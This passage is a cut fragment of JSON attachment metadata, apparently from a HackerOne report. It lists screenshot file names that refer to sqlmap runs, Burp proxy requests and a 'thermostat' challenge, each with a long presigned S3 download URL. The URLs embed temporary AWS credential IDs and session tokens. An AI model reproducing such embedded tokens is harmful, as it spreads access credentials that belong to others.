hxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6835d5db36672ef792524d08e45d99bf076e4c6abc122890204416850272223c","file_size":8840,"type":"image/png"},{"id":434404,"file_name":"sqlmap_second_run.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/404/d9eda693dd8d0b0d8d4bfd6a3a83b5addaf6dc8a/sqlmap_second_run.png?response-content-disposition=attachment%3B%20filename%3D%22sqlmap_second_run.png%22%3B%20filename%2A%3DUTF-8%27%27sqlmap_second_run.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=452e41c82f7c28febf337f61a6238c46baeab40cc260668151a18378fd6534a2","file_size":41365,"type":"image/png"},{"id":434405,"file_name":"h1thermostat_thermostat.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/405/c50f8f031f93ecbbc993cf6cbbe525816dad2c56/h1thermostat_thermostat.png?response-content-disposition=attachment%3B%20filename%3D%22h1thermostat_thermostat.png%22%3B%20filename%2A%3DUTF-8%27%27h1thermostat_thermostat.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7189911bb205d90340f1ab3642f313bc43730001ea4496dfd206d29229690006","file_size":67427,"type":"image/png"},{"id":434406,"file_name":"sqlmap_first_run.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/406/c8628a8df30c26187e3a0c37f75096c242be6fe6/sqlmap_first_run.png?response-content-disposition=attachment%3B%20filename%3D%22sqlmap_first_run.png%22%3B%20filename%2A%3DUTF-8%27%27sqlmap_first_run.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ce1d48afee6718be807d2cb71b2d607b3c45173495d072dbcf4389e3af1e7b3b","file_size":234183,"type":"image/png"},{"id":434407,"file_name":"burp_proxy_request_handling.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/407/cb246f2f53f345062a629767de320b9f3f3cf927/burp_proxy_request_handling.png?response-content-disposition=attachment%3B%20filename%3D%22burp_proxy_request_handling.png%22%3B%20filename%2A%3DUTF-8%27%27burp_proxy_request_handling.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=608e69026aa16f2973639cac9713728b81df0f981e7cd219e29c39602b001bed","file_size":30674,"type":"image/png"},{"id":434408,"file_name":"jd_gui_payload_request.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/408/19a75741ed61bf57c7bc2e684b97af4a8f062217/jd_gui_payload_request.png?response-content-disposition=attachment%3B%20filename%3D%22jd_gui_payload_request.png%22%3B%20filename%2A%3DUTF-8%27%27jd_gui_payload_request.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ac7f00111d64171a6b5c888e0e5213685169402d05b33ba1e5583b528e4989ce","file_size":10395,"type":"image/png"},{"id":434409,"file_name":"h1thermostat_cryptoblob.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/409/706ae43e2638f02bea00ee716bc8e17a90bf82c4/h1thermostat_cryptoblob.png?response-content-disposition=attachment%3B%20filename%3D%22h1thermostat_cryptoblob.png%22%3B%20filename%2A%3DUTF-8%27%27h1thermostat_cryptoblob.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=909f0f0056ac6ad823bbcc962e2512f0b72b067d268a166afd8a8ba5bd44e574","file_size":27273,"type":"image/png"},{"id":434410,"file_name":"h1thermostat_login_and_proxy.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/410/22d952f3cfafa274f6de1bc37ab0bec458196f8e/h1thermostat_login_and_proxy.png?response-content-disposition=attachment%3B%20filename%3D%22h1thermostat_login_and_proxy.png%22%3B%20filename%2A%3DUTF-8%27%27h1thermostat_login_and_proxy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=23b96a9ce02ef0ad8154448a0fee3779f873a5d3d278e302d9e0b3e457c451ff","file_size":83798,"type":"image/png"},{"id":434411,"file_name":"jd_gui_file_listing.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/411/3532e1f22b5074b5bcc43f6d6a99a8cbaa307727/jd_gui_file_listing.png?response-content-disposition=attachment%3B%20filename%3D%22jd_gui_file_listing.png%22%3B%20filename%2A%3DUTF-8%27%27jd_gui_file_listing.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=260126c703d6f60157610d039446f8c5382aa28c0ae6772afbd5ffbfcb13c8fa","file_size":14180,"type":"image/png"},{"id":434412,"file_name":"bitstring_alignment.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/412/1fca6b95235247347ec2632bdbe82cefbdb9cf2d/bitstring_alignment.png?response-content-disposition=attachment%3B%20filename%3D%22bitstring_alignment.png%22%3B%20filename%2A%3DUTF-8%27%27bitstring_alignment.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=667168bfd7936b5601c902a1c36cacd4cbf6b726a41eaccd50cdc92d349b7e77","file_size":243867,"type":"image/png"},{"id":434413,"file_name":"bitstring_overlap.gif","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/413/d27d005b669c486beb3c44c4e95e7598c887411f/bitstring_overlap.gif?response-content-disposition=attachment%3B%20filename%3D%22bitstring_overlap.gif%22%3B%20filename%2A%3DUTF-8%27%27bitstring_overlap.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLO